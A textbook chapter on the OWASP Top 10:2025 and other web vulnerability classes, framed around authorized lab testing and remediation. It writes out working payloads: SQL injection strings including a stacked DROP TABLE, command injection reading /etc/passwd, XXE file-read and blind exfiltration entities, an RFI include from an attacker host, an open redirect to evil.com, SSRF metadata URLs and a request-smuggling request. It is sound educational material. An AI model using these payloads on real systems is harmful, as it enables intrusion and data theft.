# Chapter 9: OWASP Top 10 and Beyond

> **Learning objectives.** Name and explain the OWASP Top 10:2025 categories; explain the root cause, mechanism, recognition, validation, impact, and remediation of every major web vulnerability class; distinguish real findings from false positives; and apply a consistent research template.

## 9.1 The OWASP Top 10:2025

The OWASP Top 10 is a consensus awareness document listing the most critical web application security risks. As of this writing the current edition is **OWASP Top 10:2025** (the 2021 edition is superseded). Verify the current edition at https://top10.owasp.org/ before citing it.

| ID | Category (2025) | Essence |
|----|-----------------|---------|
| A01 | Broken Access Control | Users act outside their permissions |
| A02 | Security Misconfiguration | Insecure defaults, incomplete configs, exposed services |
| A03 | Software Supply Chain Failures | Compromised or untrusted dependencies/build/deploy pipeline |
| A04 | Cryptographic Failures | Sensitive data exposed through weak/absent crypto |
| A05 | Injection | Untrusted data interpreted as code or queries |
| A06 | Insecure Design | Missing or ineffective security controls by design |
| A07 | Authentication Failures | Identity verification broken or bypassed |
| A08 | Software or Data Integrity Failures | Insecure deserialization, unverified updates/data |
| A09 | Security Logging and Alerting Failures | Attacks not detected or recorded |
| A10 | Mishandling of Exceptional Conditions | Errors/edge cases handled unsafely |

**What changed from 2021:** SSRF is now folded into A01 Broken Access Control; "Vulnerable and Outdated Components" expanded into A03 Software Supply Chain Failures; "Security Logging and Monitoring Failures" became A09 Security Logging and Alerting Failures; and A10 is a new category, Mishandling of Exceptional Conditions. Injection (A05) now includes XSS.

The Top 10 is a *starting taxonomy*, not a complete list. This chapter covers the named classes you are expected to know — including SSRF, request smuggling, prototype pollution, and business logic flaws — using a consistent 14-point research template.

## 9.2 The Research Template

For every vulnerability we examine fourteen questions:

1. **Definition** — what is it?
2. **Root cause** — what underlying assumption fails?
3. **Internal mechanism** — how does it work technically?
4. **Why developers introduce it** — what intent produces the bug?
5. **Recognition** — what signals suggest it?
6. **Investigation** — how do you explore it systematically?
7. **Safe validation** — how do you prove it in an authorized lab?
8. **Impact assessment** — what is the realistic worst case?
9. **Case study** — a fictional but realistic scenario.
10. **Remediation** — how do you fix the instance?
11. **Prevention** — how do you stop the class?
12. **False positives** — what looks like this but is not?
13. **Reporting** — what does a good submission contain?
14. **Lab exercise** — how do you practice safely?

We use this template for the major classes; compact entries still address each point.

## 9.3 Broken Access Control: IDOR, BOLA, BFLA, Privilege Escalation

**Definition.** Access control flaws let users perform actions or access data beyond their permissions. **IDOR** (Insecure Direct Object Reference) / **BOLA** (Broken Object-Level Authorization) means changing an identifier exposes another user's object. **BFLA** (Broken Function-Level Authorization) means a non-privileged user can invoke a privileged function. **Privilege escalation** is gaining higher privileges (vertical or horizontal).

**Root cause.** The server trusts an object identifier or an endpoint's obscurity instead of verifying the authenticated principal's entitlement on every request.

**Mechanism.** A request like `GET /api/orders/1042` causes a query `SELECT * FROM orders WHERE id=1042` with no `AND owner_id = current_user`. Changing `1042` to `1043` returns someone else's order.

**Why developers introduce it.** Rapid feature development, assumption that "the UI only shows your orders," microservice trust, and reliance on unguessable IDs (which are not a control).

**Recognition.** Numeric/sequential IDs, UUIDs in URLs, predictable filenames, hidden endpoints discovered in JS, differences between role responses, parameters like `user_id`, `account`, `doc`.

**Investigation.** Create two accounts in a lab. Capture a request as user A. Replace object references with user B's IDs (from your own lab accounts). Compare responses. Repeat for every method and endpoint, including bulk/export endpoints and GraphQL resolvers.

**Safe validation.** Use only your own two (or three) lab accounts. Demonstrate that account A can read/modify account B's object using an ID you control. Never touch real users' data.

**Impact.** Confidentiality breach (read others' data), integrity breach (modify/delete), and in chained cases account takeover or admin action. Severity depends on data sensitivity and whether IDs are guessable.

**Case study.** A lab GraphQL API exposes `order(id: ID!)`. The resolver queries by ID alone. Researcher Alice creates orders 5001 and 5002 under two accounts; requesting 5002 with account A's token succeeds — a clear BOLA with a measurable impact.

**Remediation.** Enforce object-level authorization on every request (e.g., `WHERE id = ? AND owner_id = ?`), use centralized policy checks, deny by default.

**Prevention.** Design authorization as a reusable layer; test with multi-role automated suites; avoid relying on client-side checks or opaque IDs.

**False positives.** A public resource (e.g., a published profile) intentionally accessible; an ID that is actually scoped to the session; a "403" that is a generic error but the data is not returned.

**Reporting.** Show two accounts, the exact request with the swapped ID, the differing response, and the data exposed; include CWE-639/CWE-862 mapping and impact.

**Lab exercise.** OWASP crAPI or Juice Shop: access another user's order or review using an ID from your own second account.

## 9.4 Injection: SQL Injection

**Definition.** Untrusted input is concatenated into a query/command so that it changes the statement's meaning.

**Root cause.** Confusion between *data* and *code* — the input is interpreted as part of the instruction.

**Mechanism.**

```python
# Vulnerable
q = "SELECT * FROM users WHERE name='" + name + "'"
# name = alice' OR '1'='1
# => SELECT * FROM users WHERE name='alice' OR '1'='1'
```

Variants: **error-based** (errors leak data), **union-based** (append `UNION SELECT`), **boolean/blind** (infer via true/false responses), **time-based blind** (`SLEEP(5)`), **out-of-band** (DNS/HTTP callbacks).

**Why developers introduce it.** String building is easy; ORM raw-query escape hatches; dynamic column/order fields; stored procedures that concatenate.

**Recognition.** Reflected input in errors, odd behavior with quotes, SQL syntax in error messages, parameters in `ORDER BY`, `LIMIT`, `LIKE`, JSON fields.

**Investigation.** Map all inputs (including headers, cookies, and JSON). Submit benign special characters and observe. In your own lab use a tool like sqlmap only against the lab application. Understand the DBMS to craft valid syntax.

**Safe validation.** In a lab, demonstrate a boolean difference or a controlled `SLEEP(5)` timing difference; extract only a known test value (e.g., `@@version`), never real data.

**Impact.** Full database read/write, authentication bypass, and in some configurations OS command execution.

**Case study.** A lab login uses concatenated SQL; input `' OR '1'='1' -- ` returns the first user and logs in — authentication bypass plus data exposure.

**Remediation.** Parameterized queries/prepared statements; stored procedures with bound parameters; allow-list dynamic identifiers; least-privilege DB accounts.

**Prevention.** Never concatenate untrusted data into queries; use ORM safely; input validation as defense in depth; WAF as a temporary layer only.

**False positives.** A quote causing a harmless 500; input safely parameterized but reflected in a page; a WAF-generated error.

**Reporting.** Show the exact parameter and payload, the response difference or timing, the DBMS inferred, and the potential data impact; CWE-89.

**Lab exercise.** DVWA/SQLi labs or PortSwigger's SQLi labs: demonstrate union, boolean-blind, and time-based detection on the lab only.

## 9.5 Cross-Site Scripting (XSS)

**Definition.** Attacker-controlled script is executed in another user's browser in the context of a vulnerable origin.

**Root cause.** Untrusted data is inserted into HTML/JS/CSS without context-appropriate encoding or restriction.

**Types.** **Reflected** (payload in request echoed in response), **stored** (payload persisted and served to others), **DOM-based** (client-side JS writes data to a dangerous sink).

**Mechanism.** `echo "<div>" . $_GET['q'] . "</div>";` with `q=<script>alert(1)</script>` executes the script. Sinks include `innerHTML`, `document.write`, `eval`, `setAttribute('href', ...)`. Contexts require different encoding: HTML body, attribute, JavaScript string, URL, CSS.

**Why developers introduce it.** Template systems that auto-escape in some contexts but not others; rich-text editors; using `innerHTML` for convenience; trusting data from "internal" APIs.

**Recognition.** Input reflected in responses; features that render user content (comments, profiles, filenames); DOM sinks in JS bundles.

**Investigation.** Map reflection points; test with harmless markers; determine the context; try appropriate encodings/bypasses only in labs; check HttpOnly and CSP.

**Safe validation.** Use a harmless proof such as `alert(document.domain)` in your own account/lab. Avoid stealing real cookies or affecting other users.

**Impact.** Session/token theft (if not HttpOnly), account takeover, defacement, phishing, keylogging, and as a stepping stone to CSRF bypass.

**Case study.** A lab comment field stores `<img src=x onerror=...><!-- Security note: this part poses a security risk and has been replaced with a placeholder; substitute your own content when using it -->`. Every viewer's browser executes it — stored XSS with a broad impact.

**Remediation.** Context-aware output encoding; HTML sanitization (e.g., DOMPurify) for rich text; `HttpOnly` cookies; a strict CSP with nonces/hashes; framework auto-escaping used correctly.

**Prevention.** Treat all data as untrusted; avoid dangerous sinks; encode on output, not input; security testing in CI.

**False positives.** Payload reflected but encoded (`&lt;script&gt;`); blocked by CSP; executed in a different origin/sandbox; self-only with no cross-user impact (still may be valid depending on program).

**Reporting.** Show the reflection point, context, harmless PoC, affected users, and whether HttpOnly/CSP limit impact; CWE-79.

**Lab exercise.** PortSwigger XSS labs (reflected, stored, DOM) and DVWA; document each context and the encoding that defeats it.

## 9.6 Cross-Site Request Forgery (CSRF)

**Definition.** An attacker causes a victim's browser to submit an unwanted request to a site where the victim is authenticated.

**Root cause.** State-changing requests rely only on ambient credentials (cookies) and lack an unforgeable per-request token or origin check.

**Mechanism.** A malicious page contains `<form action="https://bank/transfer" method="POST">` with hidden fields; the victim's browser sends their cookies. GET-based state changes can be triggered by an `<img>` tag.

**Why developers introduce it.** No framework CSRF protection; token not validated on all endpoints; `SameSite=None` cookies; assuming POST is safe.

**Recognition.** State-changing endpoints with no CSRF token, no `Origin`/`Referer` validation, relaxed `SameSite`, JSON-only endpoints with permissive CORS.

**Investigation.** Check whether a request can be replayed cross-site; remove token and observe; test method overrides; test CORS+credentials.

**Safe validation.** Build a harmless local HTML page that submits a request in your own lab account (e.g., change an email address) and show it succeeds without a token.

**Impact.** Unauthorized actions as the victim: data modification, account settings changes, purchases.

**Case study.** A lab app's `/api/email` accepts POST with a cookie and no token; a PoC page changes the victim's email, enabling later account takeover.

**Remediation.** Synchronizer tokens; double-submit cookies; `SameSite=Lax/Strict`; validate `Origin`/`Referer`; require re-authentication for sensitive actions.

**Prevention.** Enable framework CSRF protection by default; make state changes non-GET; audit all endpoints.

**False positives.** Endpoints requiring custom headers (not sendable cross-origin without CORS); token present but not obvious; protected by SameSite.

**Reporting.** PoC HTML, the request, and the observed state change; CWE-352.

**Lab exercise.** DVWA CSRF and PortSwigger CSRF labs: build a PoC that changes a lab user's details.

## 9.7 Server-Side Request Forgery (SSRF)

**Definition.** An attacker induces the server to make HTTP(S) (or other) requests to an arbitrary destination, including internal services.

**Root cause.** The server accepts a URL/host from the client and fetches it without restricting the destination.

**Mechanism.** A feature "fetch a preview of this URL" passes the input to an HTTP client. Input `http://169.254.169.254/latest/meta-data/` reaches the cloud metadata service; `http://127.0.0.1:6379/` reaches Redis.

**Why developers introduce it.** Useful features (URL previews, webhooks, image fetch, PDF generation) plus insufficient allow-listing and DNS-rebinding awareness.

**Recognition.** Parameters named `url`, `uri`, `target`, `feed`, `webhook`, `image_url`, `callback`; file imports; PDF/HTML renderers.

**Investigation.** Map fetch capabilities; test with a callback URL you control (e.g., in a lab) to confirm outbound requests; enumerate internal endpoints; study DNS and redirect behavior.

**Safe validation.** Use a local server or controlled callback domain in your lab; demonstrate a request to `127.0.0.1` or the metadata endpoint only in an authorized cloud lab. Never access real internal systems.

**Impact.** Internal service access, credential/metadata theft, port scanning via the server, and in some clouds full instance compromise.

**Case study.** A lab app fetches user-supplied avatars by URL; the researcher points it at an internal admin endpoint on `localhost` that returns a secret token — a clear SSRF with measurable impact.

**Remediation.** Strict allow-list of hosts/schemes/ports; resolve and block private/link-local ranges (including IPv6); disable redirects or re-validate each hop; network egress controls; IMDSv2 in AWS.

**Prevention.** Avoid user-controlled URLs; use a dedicated egress proxy; metadata-service hardening.

**False positives.** The server rejects or sanitizes the input; the request is made client-side; the response is a generic error with no evidence of fetching.

**Reporting.** Callback logs proving the request, destination attempted, and data returned; CWE-918.

**Lab exercise.** PortSwigger SSRF labs and a local SSRF target that fetches from a controlled listener.

## 9.8 File Upload and Remote Code Execution

**Definition.** Flaws in file-upload handling let an attacker place executable or dangerous content on the server and have it processed.

**Root cause.** Trusting client-provided filenames/content types, inadequate validation, and unsafe storage/execution paths.

**Mechanism.** Uploading `shell.php` with `Content-Type: image/png` to a directory where PHP executes leads to RCE when the file is requested. Variants: double extensions, null bytes, polyglots, `.htaccess` uploads, path traversal in filenames, SVG with scripts, ZIP slips.

**Why developers introduce it.** Convenience; relying on client-side checks; blacklists instead of allowlists; storing uploads under the web root with executable permissions.

**Recognition.** Upload endpoints; permissive file-type checks; predictable upload paths; files served from the same origin with execution enabled.

**Investigation.** In a lab, test allowed extensions, content-type handling, magic bytes, filename traversal, and how stored files are served.

**Safe validation.** Upload harmless marker files (e.g., a text file with a known string); demonstrate execution only in an isolated lab app.

**Impact.** RCE, webshell, defacement, lateral movement; possibly full server compromise.

**Case study.** A lab app checks only the `Content-Type` header; uploading a file with PHP content and an image content type to `/uploads/` yields code execution when accessed.

**Remediation.** Allow-list extensions and verify magic bytes; rename files; store outside the web root; disable execution permissions; serve from a separate origin/CDN; scan with AV; enforce size limits.

**Prevention.** Treat uploads as hostile; use a dedicated service; never trust filenames.

**False positives.** Files stored but never executed; served with `Content-Disposition: attachment` and a non-executable type; sanitized names.

**Reporting.** Exact upload request, storage path, how execution is triggered, and a harmless command output from the lab; CWE-434/CWE-94.

**Lab exercise.** DVWA/PortSwigger file-upload labs; practice detection of each bypass class.

## 9.9 XML External Entity (XXE)

**Definition.** An XML parser that resolves external entities lets an attacker read local files, make network requests, or cause DoS.

**Root cause.** DTD/external-entity processing enabled on untrusted XML.

**Mechanism.** A document with `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` and `&xxe;` in a field makes the parser include the file's contents.

**Why developers introduce it.** Default parser settings; accepting XML from clients; SOAP/SAML processing.

**Recognition.** XML-based APIs, SAML SSO, file imports (DOCX/XLSX contain XML), SOAP endpoints.

**Investigation.** In a lab, test entity declarations with a harmless local file; observe reflected content or out-of-band callbacks.

**Safe validation.** Read a known marker file you created in the lab; use OOB callbacks to a controlled listener for blind cases.

**Impact.** Local file disclosure, SSRF, DoS (billion laughs), and in some setups RCE.

**Case study.** A lab SAML endpoint parses assertions with entities enabled; a crafted assertion leaks a local config file.

**Remediation.** Disable DTDs and external entities; use hardened parsers; prefer JSON; patch XML libraries.

**Prevention.** Secure parser configuration as a default library; input validation.

**False positives.** Parser ignores DTD; error messages without file content; no OOB callback.

**Reporting.** Crafted XML, parser response or callback evidence, files accessible; CWE-611.

**Lab exercise.** PortSwigger XXE labs; observe regular and blind/external-parameter variants.

## 9.10 Path Traversal and LFI/RFI

**Definition.** Manipulating file-path input to access files outside the intended directory (traversal), include local files (LFI), or include remote files (RFI).

**Root cause.** Concatenating untrusted input into file paths without canonicalization and allow-listing.

**Mechanism.** `?file=../../etc/passwd` or URL-encoded `%2e%2e%2f`; LFI can escalate to RCE via log poisoning or `php://filter`/`data://` wrappers; RFI via `http://attacker/shell.txt` when remote includes are enabled.

**Why developers introduce it.** Dynamic template/file loading; download endpoints; missing normalization.

**Recognition.** Parameters named `file`, `path`, `template`, `page`, `doc`; filenames in URLs; download features.

**Investigation.** In a lab, try `../` sequences with various encodings; observe which files are readable; test wrappers.

**Safe validation.** Read a known marker file you placed in the lab; do not read real system/user files on shared systems.

**Impact.** Source code and credential disclosure; RCE in some cases.

**Case study.** A lab app loads templates by name; `../../../../etc/hostname` returns the host file, and log poisoning yields code execution.

**Remediation.** Canonicalize paths and verify they remain within a base directory; allow-list file IDs instead of paths; disable dangerous wrappers and remote includes.

**Prevention.** Never pass user input directly to file APIs; use mapped identifiers.

**False positives.** Generic errors; the app maps input to a safe allow-list; content is a template error, not file data.

**Reporting.** Payload, returned content, and path scope; CWE-22/CWE-98.

**Lab exercise.** DVWA file inclusion labs at several security levels; document bypasses.

## 9.11 Insecure Deserialization

**Definition.** Deserializing untrusted data into objects can trigger gadget chains and code execution.

**Root cause.** Trusting serialized data's integrity and instantiating classes from it (Java, .NET, Python `pickle`, PHP `unserialize`).

**Mechanism.** A serialized object stream can specify classes and properties; libraries like `ysoserial` construct gadget chains that execute commands when deserialized.

**Why developers introduce it.** Session storage in cookies, caching, queues, and RPC using native serialization.

**Recognition.** Cookie/session blobs that look like serialized objects (`rO0AB` base64 prefix for Java, `O:` for PHP); binary blobs; queue payloads.

**Investigation.** Identify serialization formats; in a lab use tools to generate harmless marker payloads (e.g., create a file) and observe.

**Safe validation.** Demonstrate a harmless effect in the lab (e.g., `touch /tmp/proof`).

**Impact.** RCE, authentication bypass, DoS.

**Case study.** A lab app stores a serialized Java session in a cookie; a crafted gadget executes a harmless command on the server.

**Remediation.** Do not deserialize untrusted data; use data-only formats (JSON) with schemas; sign and encrypt serialized data; use allow-lists (e.g., JEP 290 filters).

**Prevention.** Avoid native serialization for untrusted input.

**False positives.** Data is signed and verified; the format is data-only JSON; the blob is opaque binary but not deserialized by the app.

**Reporting.** Serialized payload, trigger path, and observed effect; CWE-502.

**Lab exercise.** A lab Java/PHP deserialization challenge; use a harmless gadget that writes a marker file.

## 9.12 Command and Template Injection

**Command injection (CWE-78):** untrusted input concatenated into a shell command. Example: `ping -c 1 <input>` with input `; cat /etc/passwd`. Recognize by OS commands built with user data; validate in a lab with harmless commands (`id`, `echo`). Remediate with safe APIs (no shell), argument arrays, and strict allow-lists.

**Server-Side Template Injection (SSTI, CWE-1336):** user input embedded into a template string before rendering. Example: Jinja2 `render_template_string("Hello " + name)` with `{{7*7}}` reflecting `49`. Escalate in labs to RCE via template internals. Recognize by template syntax in input and evaluated arithmetic. Remediate by using static templates with parameters and never concatenating user data into template source.

**Expression Language injection** (e.g., in SpEL, OGNL, EL) is similar: user-controlled expressions evaluated by the framework.

## 9.13 Open Redirects and Host Header Injection

**Open redirect (CWE-601):** a parameter controls a redirect target (e.g., `?next=https://evil.com`). Root cause: trusting a URL without allow-listing. Validate by showing the redirect to a controlled site in a lab. Impact: phishing, OAuth token leakage, SSRF chaining. Remediate with relative-path allow-lists or a whitelist of trusted destinations.

**Host header injection (CWE-20):** the app trusts the `Host` header to generate links, reset-password URLs, or make authorization decisions. An attacker supplies a hostile Host; poisoned links are sent to victims. Validate by sending a controlled Host in a lab and observing generated URLs. Remediate by validating Host against expected values and using configured canonical origins.

## 9.14 HTTP Request Smuggling and Cache Poisoning

**Request smuggling (CWE-444):** front-end and back-end servers disagree on where one request ends and the next begins, due to conflicting `Content-Length` and `Transfer-Encoding` headers or inconsistent parsing. An attacker prefixes a second request that is interpreted by the backend, enabling request hijacking, ACL bypass, or cache poisoning.

```
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Recognition: HTTP/1 proxies in front of HTTP/1 or HTTP/2 backends, unusual header handling, TE/CL both present. Validate only in dedicated labs (PortSwigger's smuggling labs) using harmless markers and controlled delays. Impact: session hijack, bypass of front-end controls, poisoning. Remediate by normalizing/deduplicating framing headers, using HTTP/2 end-to-end, and rejecting ambiguous requests.

**Cache poisoning:** an attacker causes a cache to store a malicious response served to other users. Root cause: cache keys ignore attacker-controlled headers (e.g., `X-Forwarded-Host`) that influence the response. Validate in a lab by checking whether a poisoned header value appears in a cached response for a normal request. Impact: mass XSS/defacement. Remediate by normalizing headers, including all influential inputs in the cache key, and disabling caching of personalized responses.

**Cache deception:** tricking a cache into storing a personalized response (e.g., by requesting a static-looking path that returns user-specific content). Remediate with careful cache rules and `Cache-Control` headers.

## 9.15 Race Conditions

**Definition.** Two or more concurrent operations interleave so that a security check and its use are inconsistent (TOCTOU).

**Root cause.** Non-atomic check-then-act sequences on shared state.

**Mechanism.** Two simultaneous requests each pass a "credit available" check, then both debit, producing a negative balance or duplicated redemption.

**Validation.** In a lab, send parallel requests with a synchronized tool (e.g., Burp Repeater in parallel, or a script with threads) and observe duplicated effects. Use your own accounts only.

**Impact.** Double-spend, coupon reuse, bypassing rate limits, duplicate account creation.

**Remediation.** Atomic operations (transactions, compare-and-swap), per-resource locks, idempotency keys, and database constraints.

**Case study.** A lab store allows applying a discount code once; two concurrent requests both succeed, applying it twice.

**Reporting.** Show timing, parallel requests, and the inconsistent final state; CWE-362.

## 9.16 Business Logic Vulnerabilities

**Definition.** Flaws in the intended workflow that let an attacker achieve a disallowed outcome using legitimate functionality.

**Root cause.** Design-level assumptions about user behavior (e.g., "users won't do that in that order").

**Recognition.** Multi-step flows, prices/limits computed client-side, negative quantities, refunds, coupons, trust in sequential steps.

**Investigation.** Map every workflow and ask "what if I skip/repeat/reorder/modify this step?" Test parameter manipulation in labs.

**Impact.** Financial loss, fraud, privilege abuse; often high-value in bug bounties because scanners cannot find them.

**Remediation.** Enforce invariants server-side; validate state transitions; use authoritative pricing; design abuse cases.

**Case study.** A lab checkout accepts a negative quantity, producing a negative total and a credit.

## 9.17 Prototype Pollution

**Definition.** In JavaScript, an attacker injects properties into `Object.prototype`, affecting all objects.

**Root cause.** Unsafe recursive merge of attacker-controlled objects with keys like `__proto__` or `constructor.prototype`.

```javascript
const merged = Object.assign({}, defaults, JSON.parse(userInput));
// userInput = {"__proto__": {"isAdmin": true}}
```

**Validation.** In a lab, pollute a harmless property and observe it appear on unrelated objects; if it reaches a privileged check, demonstrate that impact.

**Impact.** Authorization bypass, DOS, and in some cases RCE via downstream sinks.

**Remediation.** Use `Object.create(null)`, reject dangerous keys, use `Map`, validate object shapes, freeze prototypes.

## 9.18 Cryptographic Failures, Misconfiguration, Integrity, Logging, Exceptional Conditions

**A04 Cryptographic Failures (CWE-327/319/etc.).** Root cause: sensitive data handled without appropriate confidentiality/integrity. Mechanisms: plaintext storage/transport, weak algorithms (MD5, SHA1, DES, RC4), weak RNG, missing TLS, keys in source. Recognize by leaked card/SSN fields, `http://` URLs, weak JWT algorithms. Validate in labs by showing data transmitted in plaintext or reversible with weak keys. Impact: data breach, identity theft. Remediate with TLS 1.2+, AES-GCM/ChaCha20, Argon2id/bcrypt, strong RNG, proper key management. False positive: data is tokenized/encrypted at rest with managed keys.

**A02 Security Misconfiguration.** Root cause: insecure defaults or incomplete configuration. Examples: directory listing, default credentials, exposed debug/admin endpoints, verbose errors, missing security headers, unnecessary services, overly permissive CORS, cloud storage public. Recognize via headers, banners, error pages, exposed consoles. Validate by observing the misconfiguration in your lab. Remediate with hardened baselines, automated configuration checks, least functionality.

**A08 Software/Data Integrity Failures.** Root cause: trusting software updates, dependencies, or data without integrity verification. Includes insecure deserialization (above), unsigned updates, CI/CD poisoning. Remediate with signed artifacts, SBOMs, verified dependencies, and protected build pipelines.

**A09 Logging & Alerting Failures.** Root cause: insufficient detection. If attacks are not logged or alerted, breaches persist. Validate by checking whether a lab attack appears in logs and triggers alerts. Remediate with comprehensive audit logs, centralized SIEM, alerting, and tested incident response.

**A10 Mishandling of Exceptional Conditions.** Root cause: unsafe behavior in error/edge paths — null dereferences, unhandled exceptions revealing internals, fail-open authorization, numeric edge cases, race conditions. Recognize via unexpected inputs causing 500s or inconsistent behavior. Remediate with explicit error handling, fail-closed defaults, and comprehensive edge-case tests.

**A03 Software Supply Chain Failures.** Root cause: reliance on third-party code/build systems without verification. Includes vulnerable dependencies, typosquatting, dependency confusion, compromised maintainers, artifact tampering. Chapter 20 covers this in depth.

## 9.19 Subdomain Takeover

**Definition.** A subdomain's DNS record (usually CNAME) points to an external service that is no longer claimed; an attacker claims it and serves content on the organization's subdomain.

**Root cause.** Orphaned DNS records and deprovisioned cloud resources without DNS cleanup.

**Recognition.** CNAME pointing to an unclaimed S3/GitHub Pages/Heroku/Azure endpoint; `NXDOMAIN` or "NoSuchBucket" responses.

**Validation.** In an authorized program, prove the service is claimable without actually claiming production infrastructure — typically by demonstrating the dangling record and the service's unclaimed status to the program, following their rules. Never host malicious content.

**Impact.** Phishing, cookie-based session capture if cookies are scoped to the parent domain, brand damage.

**Remediation.** Remove dangling DNS records; inventory external dependencies; claim or delete resources during deprovisioning.

## 9.20 Cross-Cutting Methodology: From Signal to Finding

A repeatable research loop:

```
Observe signal (parameter, header, behavior)
   -> Form hypothesis ("this may be an IDOR")
   -> Design minimal, safe test in authorized scope
   -> Run test; record exact request/response
   -> Confirm or refute; consider false positives
   -> Assess impact with test data only
   -> Map to CWE; write report
```

The discipline of *refuting* your own hypothesis is what separates researchers from tool operators. Most candidate findings are false positives; a good researcher welcomes that, because it keeps their reports credible.

## 9.23 Mastery Deep Dive: A01 Broken Access Control

### 9.23.1 Root cause and exact mechanism

Every access-control failure is a missing or ineffective *server-side* decision: given principal P, action A, and object O, the system fails to answer "is P allowed to do A to O?" and deny by default. IDOR/BOLA is the object-level case; BFLA is the function-level case; vertical escalation is gaining a higher role; horizontal escalation is another user's equivalent data. The unifying mistake is trusting something other than an authoritative policy — an unguessable ID, a hidden UI button, a client-supplied role/tenant parameter, or network position.

```http
GET /api/v2/orders/1042 HTTP/1.1
Host: <LAB_HOST>
Authorization: Bearer <lab-user-A-token>

HTTP/1.1 200 OK
{"id":1042,"owner":"userA","total":42.00}

GET /api/v2/orders/1043 HTTP/1.1
Host: <LAB_HOST>
Authorization: Bearer <lab-user-A-token>

HTTP/1.1 200 OK
{"id":1043,"owner":"userB","total":990.00}   <-- BOLA in a lab
```

### 9.23.2 Lab-safe exploitation methodology

1. Create two (or three) accounts in your own lab: A, B, and an admin. Capture a baseline request from A.
2. Enumerate every identifier: path segments, query params, body fields, headers, and GraphQL variables. Record their shape (sequential int, UUID, hash) and whether they map to real objects.
3. Substitute B's identifiers (obtained from B's own responses) into A's requests for every method — GET, PUT, PATCH, DELETE. Test bulk/export endpoints (`/export?ids=...`) and alternate encodings (`/api/orders/1043`, `/api/orders;1043`, `/api/orders%2f1043`).
4. For BFLA, call admin endpoints with A's token. Try method overrides and content-type variations if an endpoint "blocks" one verb.
5. Demonstrate impact with *your* data only: show A reading/modifying B's object. Never touch real users' records.

### 9.23.3 Detection strategies

- Prefer object references with all-or-nothing access: compare responses for existing vs nonexistent IDs (length, timing, status). A consistent 200 with different bodies for sequential IDs is a strong signal.
- Test parameter pollution: `?id=A&id=B` — which one wins in the validator vs the data layer?
- Look for role/tenant parameters from the client (`role=admin`, `tenant_id=2`); replacing them is a direct escalation probe.
- Check that a "403" response truly omits data; some apps return 403 with a full body or a different body length that leaks existence.
- Automated detection: a multi-role test suite that replays A's request inventory with B's tokens and diffs responses.

### 9.23.4 Defense in depth and verification

Enforce a centralized authorization layer (policy engine or service) invoked on every request, with the principal derived from the verified session/token — never from a client parameter. Scope queries by owner/tenant in the data layer (`WHERE id=? AND owner_id=?`), which provides a second line of defense if the app layer is bypassed. Deny by default; make new endpoints opt-in. Verify with the same multi-role suite: every cell of the role × action × object matrix must return an explicit deny. Common mistake: relying on UUIDs — opacity is not authorization.

## 9.24 Mastery Deep Dive: A05 Injection

### 9.24.1 SQL injection — full mechanics

Injection confuses data with code. For SQL, the parse tree is determined before values are bound in a prepared statement; with concatenation, attacker characters become part of the grammar. A methodical lab validation:

```http
POST /api/search HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

q=widget' AND '1'='1
```

Observe boolean differences. Then, in the lab, determine column count with `ORDER BY n`, attempt a union with a sentinel, and confirm each technique class:

| Class | Signal | Lab payload pattern (authorized target only) |
|-------|--------|-----------------------------------------------|
| Error | SQL in error text | `q='` → expect a DB error |
| Union | Extra rows appear | `q=' UNION SELECT 1,version(),3-- ` |
| Boolean blind | Body/status toggles | `q=' AND (SELECT 1)='1` vs `' AND (SELECT 1)='2` |
| Time blind | Latency | PostgreSQL: `' AND pg_sleep(5)-- `; MySQL: `' AND SLEEP(5)-- ` |
| Stacked | Multiple statements | `'; DROP TABLE lab_tmp;-- ` (harmless lab table only) |

Extract only known sentinels (`@@version`) to prove impact. DBMS-specific syntax matters: comment markers (`-- `, `#`, `/* */`), string concatenation (`||` in PostgreSQL vs `+` in MSSQL), and catalog queries differ. Fingerprint first.

### 9.24.2 NoSQL, command, and XXE injection

**NoSQL injection** exploits query-object APIs. Send objects where scalars are expected: `{"user":"admin","pass":{"ne":"x"}}`, `{"id":{"regex":".*"}}`, or `{"balance":{"$gt":-1}}`. Detection: test type confusion (string → object/array) on every JSON field; observe auth bypass or broadened results. Defense: strict scalar type validation and schema enforcement.

**Command injection (CWE-78):** untrusted data reaches a shell. Lab-safe test commands are `id`, `echo MARKER`, and timing (`sleep 5`), using separators `;`, `&&`, `|`, backticks, `$()`. Detection: look for features that invoke OS tools (ping, nslookup, convert, ffmpeg, PDF generators). Defense: avoid the shell — use library/API calls with argument arrays; if a shell is unavoidable, allow-list inputs and escape per-shell. Verify that metacharacters are treated literally.

**XXE (CWE-611):** an XML parser resolves external entities. Lab pattern:

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><name>&xxe;</name></root>
```

Blind XXE uses an external parameter entity to a lab listener: `<!ENTITY % ext SYSTEM "http://<LAB_HOST>:8000/xxe?d=%file;"> %ext;`. Detect by submitting a doctype with a harmless file you created in the lab and observing reflected content or a callback. Defense: disable DTD processing and external entities in the parser configuration; prefer JSON; patch XML libraries. Verify with the same payload — it must be ignored or rejected.

### 9.24.3 Defense summary and verification

Use parameterized queries for all data; allow-list the few places where identifiers/tables are dynamic (map a key to a fixed string). Use least-privilege DB accounts (no `FILE`, no `xp_cmdshell`, no DDL for the app user). Validate input types as defense in depth, but never rely on escaping as the primary control. For command execution, use safe APIs; for XML, disable entity resolution. Verify each fix by replaying the exact lab payloads and confirming they produce literal data, errors, or timeouts with no exfiltration.

## 9.25 Mastery Deep Dive: A07 Authentication Failures and A04 Cryptographic Failures

### 9.25.1 Authentication failures

Root cause: identity verification is bypassable, weak, or not enforced on every path. Concrete lab-safe checks:

- **Enumeration:** compare responses/timing for existing vs nonexistent users; a consistent difference is a finding.
- **Credential stuffing/brute force:** absence of rate limiting, lockout, or CAPTCHA on login, OTP, and password-reset endpoints.
- **Logic bypasses:** type juggling (`{"user":["admin"]}`), duplicate JSON keys, parameter pollution (`?user=a&user=admin`), unexpected content types, and response manipulation (changing a failed login response in a proxy — only proves client-side trust, which is itself a bug).
- **MFA:** codes that can be reused, omitted via a "trusted device" endpoint called directly, or brute-forced without limits.
- **Session handling:** fixation, non-rotation, weak entropy, logout that does not invalidate server-side, and sessions surviving password change.
- **Password reset:** predictable tokens, tokens in URLs (referrer leakage), no expiry, and Host-header poisoning of reset links.

Defense: centralized auth with secure session lifecycle, MFA, rate limits keyed on account and IP, constant-time credential comparison, and generic error messages. Verify by scripting the bypass and confirming rejection with a 401/429 and a generic body.
